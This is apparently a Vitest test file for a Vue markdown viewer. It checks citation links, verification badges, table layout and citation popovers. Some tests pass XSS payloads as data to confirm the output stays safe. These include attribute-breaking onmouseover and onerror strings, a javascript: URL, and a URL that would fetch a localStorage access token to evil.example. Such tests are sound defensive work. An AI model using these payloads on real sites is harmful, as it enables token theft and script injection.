// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import { mount } from "@vue/test-utils";
import { nextTick } from "vue";
import { compileStyle, parse } from "vue/compiler-sfc";

import { i18n } from "@/i18n";
import MarkdownView from "./MarkdownView.vue";
import markdownViewSource from "./MarkdownView.vue?raw";
import type { CitationGround, SourcePreview } from "@/lib/types";

function render(
  source: string,
  sources?: SourcePreview[],
  extra: { grounding?: CitationGround[]; verify?: boolean } = {},
) {
  return mount(MarkdownView, { props: { source, sources, ...extra }, global: { plugins: [i18n] } });
}

function citationHrefs(wrapper: ReturnType<typeof render>): Record<string, string | null> {
  const out: Record<string, string | null> = {};
  for (const el of wrapper.findAll(".md-citation")) out[el.text()] = el.attributes("href") ?? null;
  return out;
}

// Every event-handler attribute (onerror, onmouseover, …) anywhere in the rendered DOM.
function eventHandlers(wrapper: ReturnType<typeof render>): string[] {
  const root = wrapper.element as Element;
  return Array.from(root.querySelectorAll<Element>("*")).flatMap((el) =>
    Array.from(el.attributes)
      .filter((a) => /^on/i.test(a.name))
      .map((a) => `${el.tagName.toLowerCase()}[${a.name}]`),
  );
}

describe("MarkdownView citations", () => {
  it("links [Sn] to the explicit source map and percent-encodes attribute-breaking URLs", () => {
    const wrapper = render("Claim one [S1]. Claim two [S2].", [
      { source_id: "S1", url: "https://one.example/a" },
      { source_id: "S2", url: 'https://two.example/"onmouseover="x' },
    ]);

    const links = wrapper.findAll("a.md-citation");
    expect(links).toHaveLength(2);
    expect(links[0].attributes()).toMatchObject({
      href: "https://one.example/a",
      target: "_blank",
      rel: "noopener noreferrer",
    });
    // The quote is percent-encoded inside href — no injected event-handler attribute.
    expect(links[1].attributes("href")).toBe("https://two.example/%22onmouseover=%22x");
    expect(eventHandlers(wrapper)).toEqual([]);
  });

  it("renders a citation without a known URL as plain text, never as a link", () => {
    const wrapper = render("Unbacked claim [S7].", [{ source_id: "S7", url: "javascript:alert(1)" }]);

    expect(wrapper.find("a.md-citation").exists()).toBe(false);
    expect(wrapper.find("sup.md-citation").text()).toBe("[S7]");
  });

  it("falls back to the report's Sources section for older reports without a map", () => {
    const wrapper = render("Claim [S3].\n\n## Sources\n\n- [S3] Example — https://legacy.example/page");

    expect(citationHrefs(wrapper)).toEqual({ "[S3]": "https://legacy.example/page" });
  });

  it("keeps the explicit map authoritative; report lines only fill missing ids", () => {
    // A body sentence that cites [S1] next to an unrelated URL must not re-point S1.
    const wrapper = render(
      "Per the vendor blog (https://vendor.example/post) the figure grew [S1].\n\n" +
        "## Sources\n\n- [S1] Official stats — https://stale.example/old\n- [S2] Extra — https://two.example/b",
      [{ source_id: "S1", url: "https://stats.example/table" }],
    );

    expect(citationHrefs(wrapper)).toMatchObject({
      "[S1]": "https://stats.example/table",
      "[S2]": "https://two.example/b",
    });
  });

  // [Sn] inside an attribute value (image alt, link title) must stay plain text: turning it
  // into <a href="…"> there closes the attribute and lets the URL add event handlers.
  const EVIL_TEXT_URL = "https://x.example/p/onerror=alert`1`//";
  const EVIL_EXPLICIT_URL = "https://evil.example/p/onerror=fetch('//evil.example/'+localStorage.access_token)//";

  it.each<[string, string, SourcePreview[] | undefined]>([
    ["image alt, URL from the report text", `- [S9] (${EVIL_TEXT_URL})\n\nIntro ![[S9]](https://nope.invalid/a.png)`, undefined],
    [
      "link title, URL from the report text",
      '[S4] https://x.example/p/onmouseover=alert`document.cookie`//\n\nRead [more](https://ok.example "[S4]").',
      undefined,
    ],
    ["link title, explicit source URL", 'See [here](https://ok.example "[S1]") now.', [{ source_id: "S1", url: EVIL_EXPLICIT_URL }]],
    ["image alt, explicit source URL", "Chart ![[S1]](https://nope.invalid/a.png)", [{ source_id: "S1", url: EVIL_EXPLICIT_URL }]],
  ])("never rewrites a citation inside an attribute (%s)", (_name, source, sources) => {
    const wrapper = render(source, sources);

    expect(eventHandlers(wrapper)).toEqual([]);
    const img = wrapper.find("img");
    if (img.exists()) expect(img.attributes("alt")).toMatch(/^\[S\d\]$/);
    const titled = wrapper.find("a[title]");
    if (titled.exists()) expect(titled.attributes("title")).toMatch(/^\[S\d\]$/);
  });

  it("keeps attributes intact in verify mode and with a grounding URL", () => {
    const wrapper = render(
      "Intro text here ![[S2]. Next claim](https://nope.invalid/a.png) and more [S2]. Another [S2].",
      undefined,
      {
        verify: true,
        grounding: [{ source_id: "S2", url: EVIL_EXPLICIT_URL, title: "t", quote: "q", supported: true }],
      },
    );

    expect(eventHandlers(wrapper)).toEqual([]);
    // Neither a citation link nor a claim-band span lands inside the alt text.
    expect(wrapper.find("img").attributes("alt")).toBe("[S2]. Next claim");
    // Body citations still link, to the percent-encoded grounding URL.
    expect(wrapper.find("a.md-citation").attributes("href")).toBe(
      "https://evil.example/p/onerror=fetch(%27//evil.example/%27+localStorage.access_token)//",
    );
    expect(wrapper.findAll(".md-claim").length).toBeGreaterThan(0);
  });

  // Rows of cell texts (th/td), with the verify-mode support badges left out.
  function tableCells(wrapper: ReturnType<typeof render>): string[][] {
    return wrapper.findAll("tr").map((tr) =>
      tr.findAll("th, td").map((cell) => {
        const copy = cell.element.cloneNode(true) as Element;
        copy.querySelectorAll(".md-claim-badge").forEach((b) => b.remove());
        return (copy.textContent || "").trim();
      }),
    );
  }

  it.each<[string, string]>([
    [
      "outer pipes",
      "| Metric | Value | Source |\n|---|---|---|\n| Revenue grew | $5B in 2024 [S1] | [S1] |\n| Users | 10M. Up 5% [S2] | [S2] |",
    ],
    [
      "no outer pipes",
      "Metric | Value | Source\n--- | --- | ---\nRevenue grew | $5B in 2024 [S1] | [S1]\nUsers | 10M. Up 5% [S2] | [S2]",
    ],
    [
      "inside a blockquote, escaped pipe",
      "> | Metric | Value | Source |\n> |---|---|---|\n> | Revenue grew | $5B \\| 2024 [S1] | [S1] |\n> | Users | 10M. Up 5% [S2] | [S2] |",
    ],
    [
      // markdown-it reads a bare CR as a line break: the table's rows move down a line.
      "after a bare CR",
      "Intro line.\rMore context.\n\n| Metric | Value | Source |\n|---|---|---|\n| Revenue grew | $5B in 2024 [S1] | [S1] |\n| Users | 10M. Up 5% [S2] | [S2] |",
    ],
    [
      "CRLF line endings",
      "| Metric | Value | Source |\r\n|---|---|---|\r\n| Revenue grew | $5B in 2024 [S1] | [S1] |\r\n| Users | 10M. Up 5% [S2] | [S2] |\r\n",
    ],
  ])("keeps a cited table's cells in verify mode (%s)", (_name, source) => {
    const sources = [
      { source_id: "S1", url: "https://one.example/a" },
      { source_id: "S2", url: "https://two.example/b" },
    ];
    const plain = tableCells(render(source, sources));
    const verified = render(source, sources, { verify: true });

    expect(plain).toHaveLength(3);
    expect(plain[1]).toHaveLength(3);
    expect(tableCells(verified)).toEqual(plain);
    // Each cited cell is its own claim: the band span sits inside the cell and holds the
    // cell's citation and its badge (a span crossing cells would be split by the parser).
    const claims = verified.findAll(".md-claim");
    expect(claims).toHaveLength(4);
    for (const claim of claims) {
      expect(claim.element.closest("td")).not.toBeNull();
      expect(claim.findAll(".md-citation")).toHaveLength(1);
      expect(claim.findAll(".md-claim-badge")).toHaveLength(1);
    }
    expect(verified.findAll("a.md-citation")).toHaveLength(4);
  });

  it("drops the link for a URL that does not parse as http(s)", () => {
    const wrapper = render("Claim [S1]. Other [S2].", [
      { source_id: "S1", url: "https://" },
      { source_id: "S2", url: "https://ok.example/a b" },
    ]);

    expect(citationHrefs(wrapper)).toEqual({ "[S1]": null, "[S2]": "https://ok.example/a%20b" });
  });
});

describe("MarkdownView inline verification", () => {
  const sources = [
    { source_id: "S1", url: "https://one.example/a" },
    { source_id: "S2", url: "https://two.example/b" },
  ];

  it("marks a claim backed by two independent sources as strong", () => {
    const wrapper = render("Output doubled in 2024 [S1][S2].", sources, { verify: true });

    const badge = wrapper.find(".md-claim-badge-strong");
    expect(badge.exists()).toBe(true);
    expect(badge.text()).toBe("✓2");
    expect(wrapper.find(".md-claim-strong").exists()).toBe(true);
  });

  function renderVerified(source: string, extra: Record<string, unknown>) {
    return mount(MarkdownView, {
      props: { source, sources, verify: true, ...extra },
      global: { plugins: [i18n] },
    });
  }
  // The claim's own words, as the underline covers them.
  const underlined = (w: ReturnType<typeof renderVerified>, band: string) =>
    w.findAll(`.md-claim-${band} .md-claim-text`).map((s) => s.element.textContent);

  // A decoration on the claim span ran under the chips, their glue and the badge (VIS-2).
  it("underlines a flagged claim's words only, never its chips, their glue or its badge", () => {
    const wrapper = renderVerified("Prices **fell** sharply [S1] [S2]. Output doubled in 2024 [S1].", {
      grounding: [
        { source_id: "S1", url: "https://one.example/a", title: "", quote: "", supported: false },
        { source_id: "S2", url: "https://two.example/b", title: "", quote: "", supported: false },
      ],
    });

    // Across inline markup too: each text run of the claim is its own underlined span.
    expect(underlined(wrapper, "weak")).toEqual(["Prices", "fell", "sharply", "Output doubled in 2024"]);
    const article = wrapper.find("article").element;
    expect(article.querySelector(".md-claim-text .md-citation, .md-claim-text .md-claim-badge")).toBeNull();
    for (const run of article.querySelectorAll(".md-claim-text")) {
      expect(run.textContent).not.toMatch(/[ [\]]|^\s|\s$/);
    }
    // The glue still sits between the word and its chips, so no chip starts a line.
    expect(article.innerHTML).toContain('sharply</span>&nbsp;<a href="https://one.example/a"');
    expect(wrapper.findAll(".md-claim-weak .md-citation")).toHaveLength(3);
  });

  it("underlines contested claims the same way, table cells included, and never strong ones", () => {
    const table = "| Metric | Value |\n|---|---|\n| Energy | 140–175 Wh/kg [S1] [S2] |";
    const wrapper = renderVerified(`Output doubled in 2024 [S1][S2].\n\n${table}`, {
      contradictions: ["| Energy | 140–175 Wh/kg [S1] [S2] |"],
    });

    expect(wrapper.find(".md-claim-strong").exists()).toBe(true);
    expect(wrapper.find(".md-claim-strong .md-claim-text").exists()).toBe(false);
    expect(underlined(wrapper, "contested")).toEqual(["140–175 Wh/kg"]);
    expect(wrapper.find("td .md-claim-contested .md-claim-text").exists()).toBe(true);
  });

  it("leaves the text undecorated with verification off", () => {
    const wrapper = render("Output doubled in 2024 [S1][S2].", sources);

    expect(wrapper.find(".md-claim").exists()).toBe(false);
    expect(wrapper.find(".md-claim-badge").exists()).toBe(false);
  });

  // The marks are emitted inside v-html, which never carries the component's data-v
  // attribute: a plain scoped rule would match nothing.
  it("styles the v-html claim marks through :deep()", () => {
    const { descriptor } = parse(markdownViewSource);
    const scoped = descriptor.styles.find((s) => s.scoped);
    expect(scoped).toBeTruthy();
    const { code, errors } = compileStyle({
      source: scoped!.content,
      id: "data-v-test",
      scoped: true,
      filename: "MarkdownView.vue",
    });

    expect(errors).toEqual([]);
    for (const cls of ["md-claim-weak", "md-claim-contested", "md-claim-badge", "md-claim-badge-strong"]) {
      expect(code).toContain(`[data-v-test] .${cls}`);
      expect(code).not.toContain(`.${cls}[data-v-test]`);
    }
  });
});

describe("MarkdownView reading surface", () => {
  it("glues each citation to the word before it, so none starts a line", () => {
    const wrapper = render("Prices fell sharply [S1] [S2]. Next claim\t[S1].", [
      { source_id: "S1", url: "https://one.example/a" },
      { source_id: "S2", url: "https://two.example/b" },
    ]);
    // Serialized HTML writes the no-break space (U+00A0) as &nbsp;.
    const html = wrapper.find("article").element.innerHTML;

    expect(html).toContain("sharply&nbsp;<a");
    expect(html).toContain("</a>&nbsp;<a");
    expect(html).toContain("claim&nbsp;<a");
    expect(wrapper.find("article").text()).toContain(["sharply", "[S1]", "[S2]"].join(String.fromCharCode(0xa0)));
    expect(wrapper.findAll("a.md-citation")).toHaveLength(3);
  });

  it("keeps table headers in the UI face: serif applies to headings only", () => {
    const cls = render("# Title").find("article").classes();

    expect(cls).toContain("prose-h1:font-serif");
    expect(cls.some((c) => c.startsWith("prose-headings:font-"))).toBe(false);
  });

  // A table wider than a narrow split-view column scrolled the whole panel sideways.
  it("gives every table its own sideways scroller, faded while more of it waits", async () => {
    const source = "Intro [S1].\n\n| Metric | Value |\n|---|---|\n| Revenue | $5B [S1] |\n\nAfter.";
    const wrapper = render(source, [{ source_id: "S1", url: "https://one.example/a" }], { verify: true });
    await nextTick();

    const scrollers = wrapper.findAll(".md-table-scroll");
    expect(scrollers).toHaveLength(1);
    const el = scrollers[0].element as HTMLElement;
    expect(el.children).toHaveLength(1);
    expect(el.firstElementChild?.tagName).toBe("TABLE");
    // The claims inside the table are still decorated cell by cell.
    expect(el.querySelector("td .md-claim")).not.toBeNull();

    // jsdom has no layout: a 300px box over a 600px table, scrolled by hand.
    let left = 0;
    Object.defineProperty(el, "clientWidth", { configurable: true, get: () => 300 });
    Object.defineProperty(el, "scrollWidth", { configurable: true, get: () => 600 });
    Object.defineProperty(el, "scrollLeft", { configurable: true, get: () => left });
    el.dispatchEvent(new Event("scroll"));
    expect(el.classList.contains("edge-fade-x")).toBe(true);
    left = 300;
    el.dispatchEvent(new Event("scroll"));
    expect(el.classList.contains("edge-fade-x")).toBe(false);
  });

  it("lets the table scroller, not the report column, take the overflow", () => {
    const { descriptor } = parse(markdownViewSource);
    const { code } = compileStyle({
      source: descriptor.styles.find((s) => s.scoped)!.content,
      id: "data-v-test",
      scoped: true,
      filename: "MarkdownView.vue",
    });

    expect(code).toMatch(/\[data-v-test\] \.md-table-scroll \{[^}]*overflow-x: auto/);
  });
});

describe("MarkdownView citation popover", () => {
  const sources = [{ source_id: "S1", url: "https://www.one.example/a" }];
  const grounding: CitationGround[] = [
    { source_id: "S1", url: "https://www.one.example/a", title: "One", quote: "Exact words from the source.", supported: true },
  ];
  let mounted: ReturnType<typeof render> | null = null;

  function renderCited(extra: { grounding?: CitationGround[] } = { grounding }) {
    mounted = mount(MarkdownView, {
      props: { source: "Prices fell [S1].", sources, ...extra },
      global: { plugins: [i18n] },
      attachTo: document.body,
    });
    return mounted;
  }
  // jsdom has no PointerEvent: a MouseEvent carrying a pointerType stands in for one.
  function pointer(type: string, pointerType: string) {
    const e = new MouseEvent(type, { bubbles: true, cancelable: true });
    Object.defineProperty(e, "pointerType", { value: pointerType });
    return e;
  }
  function popoverFor(link: Element): HTMLElement | null {
    return document.getElementById(link.getAttribute("aria-describedby") || "");
  }

  afterEach(() => {
    mounted?.unmount();
    mounted = null;
    vi.useRealTimers();
  });

  it("marks a grounded citation for the popover instead of a title tooltip", () => {
    const link = renderCited().find("a.md-citation");

    expect(link.attributes("title")).toBeUndefined();
    expect(link.attributes("data-cite")).toBe("S1");
    expect(link.attributes("aria-describedby")).toMatch(/^cite-pop-/);
  });

  it("keeps an ungrounded citation a plain link", () => {
    const link = renderCited({}).find("a.md-citation");

    expect(link.attributes("data-cite")).toBeUndefined();
    expect(link.attributes("aria-describedby")).toBeUndefined();
  });

  it("shows the quote, status and source on keyboard focus", async () => {
    const link = renderCited().find("a.md-citation");

    await link.trigger("focusin");
    const pop = popoverFor(link.element);
    expect(pop?.textContent).toContain("Exact words from the source.");
    expect(pop?.textContent).toContain(i18n.global.t("citation.supported"));
    expect(pop?.textContent).toContain("one.example");
    expect(pop?.querySelector("a")?.getAttribute("href")).toBe("https://www.one.example/a");
  });

  it("opens after a short hover intent with a mouse", async () => {
    vi.useFakeTimers();
    const link = renderCited().find("a.md-citation");

    link.element.dispatchEvent(pointer("pointerover", "mouse"));
    await nextTick();
    expect(popoverFor(link.element)).toBeNull();
    vi.advanceTimersByTime(150);
    await nextTick();
    expect(popoverFor(link.element)).not.toBeNull();
  });

  it("opens on the first tap instead of navigating; the second tap follows the link", async () => {
    const link = renderCited().find("a.md-citation");
    // Sees each click after the view has handled it, then stops jsdom's navigation.
    function tap(): boolean | null {
      let prevented: boolean | null = null;
      const probe = (e: Event) => {
        prevented = e.defaultPrevented;
        e.preventDefault();
      };
      document.addEventListener("click", probe, { once: true });
      link.element.dispatchEvent(pointer("pointerdown", "touch"));
      link.element.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
      return prevented;
    }

    expect(tap()).toBe(true);
    await nextTick();
    expect(popoverFor(link.element)).not.toBeNull();

    expect(tap()).toBe(false);
  });

  // A popover above its citation grew up from its bottom edge but dropped 4px towards it.
  it.each<[string, number, string, string]>([
    ["below a citation that has room under it", 100, "-4px", "0"],
    ["above a citation near the bottom of the view", 700, "4px", "100%"],
  ])("comes out of the citation when placed %s", async (_name, top, dy, originY) => {
    const height = vi.spyOn(HTMLElement.prototype, "offsetHeight", "get").mockReturnValue(120);
    try {
      const link = renderCited().find("a.md-citation");
      vi.spyOn(link.element, "getBoundingClientRect").mockReturnValue(
        { top, bottom: top + 18, left: 100, right: 130, width: 30, height: 18, x: 100, y: top, toJSON: () => ({}) } as DOMRect,
      );

      await link.trigger("focusin");
      await nextTick();
      const pop = popoverFor(link.element)!;
      expect(pop.classList).toContain("cite-pop");
      // jsdom's viewport is 768px tall: 700 + 18 + 6 + 120 does not fit below it.
      expect(pop.style.top).toBe(dy === "4px" ? `${top - 6 - 120}px` : `${top + 18 + 6}px`);
      expect(pop.style.getPropertyValue("--pop-dy")).toBe(dy);
      expect(pop.getAttribute("style")).toMatch(new RegExp(`transform-origin: \\S+ ${originY.replace("%", "\\%")}`));
    } finally {
      height.mockRestore();
    }
  });

  it("points the pop offset through --pop-dy for the citation popover only", () => {
    const { descriptor } = parse(markdownViewSource);
    const { code } = compileStyle({
      source: descriptor.styles.find((s) => s.scoped)!.content,
      id: "data-v-test",
      scoped: true,
      filename: "MarkdownView.vue",
    });

    expect(code).toMatch(
      /\.cite-pop\.pop-enter-from\[data-v-test\],\s*\.cite-pop\.pop-leave-to\[data-v-test\] \{\s*transform: translateY\(var\(--pop-dy, -4px\)\) scale\(0\.96\);/,
    );
  });

  it("closes on Escape", async () => {
    const link = renderCited().find("a.md-citation");

    await link.trigger("focusin");
    expect(popoverFor(link.element)).not.toBeNull();
    document.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }));
    // The pop leave transition removes the element a frame later.
    await new Promise((r) => setTimeout(r, 50));
    expect(popoverFor(link.element)).toBeNull();
    expect(document.activeElement).toBe(link.element);
  });
});
